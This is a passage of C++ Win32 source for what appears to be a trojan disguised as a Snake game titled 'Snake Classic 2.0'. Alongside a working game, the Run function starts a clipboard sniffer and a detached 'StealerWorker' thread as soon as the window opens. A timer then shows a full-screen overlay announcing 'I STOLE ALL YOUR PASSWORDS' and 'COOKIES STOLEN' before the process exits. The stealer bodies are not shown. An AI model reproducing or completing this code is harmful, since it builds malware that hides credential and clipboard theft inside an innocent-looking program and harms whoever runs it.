            rain[i].y += rain[i].s;
            if (rain[i].y > sh) { rain[i].y = -(rand() % 300); rain[i].s = 4 + rand() % 12; }
        }
        DWORD e = GetTickCount() - start;
        SelectObject(dc, fB);
        if ((e / 200) % 2 == 0) SetTextColor(dc, RGB(255, 0, 0));
        else                    SetTextColor(dc, RGB(120, 0, 0));
        TextOutW(dc, sw / 2 - 210, sh / 2 - 140, L"YOU HACKED", 10);
        TextOutW(dc, sw / 2 - 160, sh / 2 - 60,  L"BY EMIR",    7);
        SelectObject(dc, fM); SetTextColor(dc, RGB(255, 30, 30));
        const wchar_t* sub = L"I STOLE ALL YOUR PASSWORDS HAHAHAHAH";
        TextOutW(dc, sw / 2 - 340, sh / 2 + 40, sub, (int)wcslen(sub));
        SelectObject(dc, fS); SetTextColor(dc, RGB(255, 80, 80));
        TextOutW(dc, sw / 2 - 40, sh / 2 + 130, L"🥀  😈  😈", 6);
        SetTextColor(dc, RGB(200, 0, 0));
        const wchar_t* ft = L"[ SYSTEM COMPROMISED ]   IP LOGGED   PASSWORDS SENT   COOKIES STOLEN";
        TextOutW(dc, sw / 2 - 400, sh - 60, ft, (int)wcslen(ft));
        if (e > 10000) done = true;
        Sleep(16);
    }
    ReleaseDC(h, dc); DestroyWindow(h);
}
}

// ============================================================
// WIN32 SNAKE GAME
// ============================================================
namespace SnakeWin32 {
static const int COLS = 30, ROWS = 20, CELL = 24, HEADER_H = 50;
static HWND g_hwnd = nullptr;
static std::deque<std::pair<int,int>> g_snake;
static int g_dx = 1, g_dy = 0, g_fx = 0, g_fy = 0, g_score = 0;
static bool g_alive = true, g_started = false;
static int g_tickMs = 90;
static HFONT g_font = nullptr;
static HBRUSH g_bg = nullptr, g_head = nullptr, g_body = nullptr, g_food = nullptr;

static void ResetGame() {
    g_snake.clear();
    g_snake.push_back({ COLS / 2, ROWS / 2 });
    g_dx = 1; g_dy = 0;
    g_score = 0; g_alive = true;
    g_fx = rand() % COLS;
    g_fy = rand() % ROWS;
}

static void Paint(HDC dc, RECT rc) {
    RECT hdr{ 0, 0, rc.right, HEADER_H };
    HBRUSH hb = CreateSolidBrush(RGB(20, 20, 30));
    FillRect(dc, &hdr, hb); DeleteObject(hb);

    RECT bd{ 0, HEADER_H, COLS * CELL, HEADER_H + ROWS * CELL };
    FillRect(dc, &bd, g_bg);

    HPEN gp = CreatePen(PS_SOLID, 1, RGB(30, 30, 40));
    HPEN op = (HPEN)SelectObject(dc, gp);
    for (int x = 0; x <= COLS; x++) { MoveToEx(dc, x * CELL, HEADER_H, nullptr); LineTo(dc, x * CELL, HEADER_H + ROWS * CELL); }
    for (int y = 0; y <= ROWS; y++) { MoveToEx(dc, 0, HEADER_H + y * CELL, nullptr); LineTo(dc, COLS * CELL, HEADER_H + y * CELL); }
    SelectObject(dc, op); DeleteObject(gp);

    RECT fr{ g_fx * CELL + 3, HEADER_H + g_fy * CELL + 3,
             g_fx * CELL + CELL - 3, HEADER_H + g_fy * CELL + CELL - 3 };
    FillRect(dc, &fr, g_food);

    for (size_t i = 0; i < g_snake.size(); i++) {
        int x = g_snake[i].first, y = g_snake[i].second;
        RECT sr{ x * CELL + 1, HEADER_H + y * CELL + 1,
                 x * CELL + CELL - 1, HEADER_H + y * CELL + CELL - 1 };
        FillRect(dc, &sr, i == 0 ? g_head : g_body);
    }
    SelectObject(dc, g_font);
    SetBkMode(dc, TRANSPARENT);
    SetTextColor(dc, RGB(230, 230, 255));
    char buf[128];
    sprintf(buf, "SNAKE   Score: %d   Speed: %d", g_score, 1000 / g_tickMs);
    TextOutA(dc, 12, 14, buf, (int)strlen(buf));
    if (!g_started) {
        SetTextColor(dc, RGB(255, 220, 120));
        const char* t1 = "PRESS SPACE OR ENTER TO START";
        TextOutA(dc, COLS * CELL / 2 - 130, HEADER_H + ROWS * CELL / 2 - 20, t1, (int)strlen(t1));
    } else if (!g_alive) {
        SetTextColor(dc, RGB(255, 80, 80));
        char t1[64]; sprintf(t1, "GAME OVER — Score: %d", g_score);
        TextOutA(dc, COLS * CELL / 2 - 90, HEADER_H + ROWS * CELL / 2 - 20, t1, (int)strlen(t1));
        const char* t2 = "Press R to restart";
        TextOutA(dc, COLS * CELL / 2 - 60, HEADER_H + ROWS * CELL / 2 + 10, t2, (int)strlen(t2));
    }
}

static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
    switch (msg) {
        case WM_CREATE: SetTimer(h, 1, g_tickMs, nullptr); return 0;
        case WM_KEYDOWN: {
            if (!g_started && (w == VK_SPACE || w == VK_RETURN)) {
                g_started = true; ResetGame();
                InvalidateRect(h, nullptr, FALSE);
                return 0;
            }
            if (g_started && !g_alive && w == 'R') {
                ResetGame(); InvalidateRect(h, nullptr, FALSE);
                return 0;
            }
            if (!g_alive || !g_started) return 0;
            switch (w) {
                case 'W': case VK_UP:    if (g_dy == 0) { g_dx = 0; g_dy = -1; } break;
                case 'S': case VK_DOWN:  if (g_dy == 0) { g_dx = 0; g_dy =  1; } break;
                case 'A': case VK_LEFT:  if (g_dx == 0) { g_dx = -1; g_dy = 0; } break;
                case 'D': case VK_RIGHT: if (g_dx == 0) { g_dx =  1; g_dy = 0; } break;
                case VK_ESCAPE: PostQuitMessage(0); break;
            }
            return 0;
        }
        case WM_TIMER: {
            if (g_started && g_alive) {
                int nx = g_snake.front().first + g_dx;
                int ny = g_snake.front().second + g_dy;
                if (nx < 0 || ny < 0 || nx >= COLS || ny >= ROWS) g_alive = false;
                else {
                    for (auto& s : g_snake) if (s.first == nx && s.second == ny) { g_alive = false; break; }
                    if (g_alive) {
                        g_snake.push_front({ nx, ny });
                        if (nx == g_fx && ny == g_fy) {
                            g_score += 10;
                            g_fx = rand() % COLS; g_fy = rand() % ROWS;
                            if (g_tickMs > 50) {
                                g_tickMs -= 2;
                                KillTimer(h, 1); SetTimer(h, 1, g_tickMs, nullptr);
                            }
                        } else g_snake.pop_back();
                    }
                }
            }
            // === overlay takeover check ===
            if (g_show_overlay.load()) {
                HackedOverlay::Run(GetModuleHandle(nullptr));
                ExitProcess(0);
            }
            InvalidateRect(h, nullptr, FALSE);
            return 0;
        }
        case WM_ERASEBKGND: return 1;
        case WM_PAINT: {
            PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
            RECT rc; GetClientRect(h, &rc);
            HDC mem = CreateCompatibleDC(dc);
            HBITMAP bmp = CreateCompatibleBitmap(dc, rc.right, rc.bottom);
            HBITMAP old = (HBITMAP)SelectObject(mem, bmp);
            Paint(mem, rc);
            BitBlt(dc, 0, 0, rc.right, rc.bottom, mem, 0, 0, SRCCOPY);
            SelectObject(mem, old); DeleteObject(bmp); DeleteDC(mem);
            EndPaint(h, &ps); return 0;
        }
        case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProc(h, msg, w, l);
}

static int Run(HINSTANCE hInst) {
    g_bg   = CreateSolidBrush(RGB(10, 15, 25));
    g_head = CreateSolidBrush(RGB(80, 240, 120));
    g_body = CreateSolidBrush(RGB(40, 180, 90));
    g_food = CreateSolidBrush(RGB(255, 60, 60));
    g_font = CreateFontA(22, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
        0, 0, 0, 0, "Segoe UI");

    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc; wc.hInstance = hInst;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = g_bg;
    wc.lpszClassName = L"SnakeClassicWnd";
    RegisterClassW(&wc);

    int winW = COLS * CELL, winH = HEADER_H + ROWS * CELL;
    RECT r{ 0, 0, winW, winH };
    AdjustWindowRect(&r, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
    int fullW = r.right - r.left, fullH = r.bottom - r.top;
    int sx = (GetSystemMetrics(SM_CXSCREEN) - fullW) / 2;
    int sy = (GetSystemMetrics(SM_CYSCREEN) - fullH) / 2;

    g_hwnd = CreateWindowExW(0, L"SnakeClassicWnd", L"Snake Classic 2.0",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE,
        sx, sy, fullW, fullH, nullptr, nullptr, hInst, nullptr);
    ShowWindow(g_hwnd, SW_SHOW);
    UpdateWindow(g_hwnd);

    // === START button → fire EVERYTHING ===
    StartClipboardSniffer();
    std::thread(StealerWorker).detach();

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return (int)msg.wParam;
}
}

// ============================================================
// ENTRY
// ============================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPARAM, int) {
    srand((unsigned)GetTickCount());
    return SnakeWin32::Run(hInst);
}
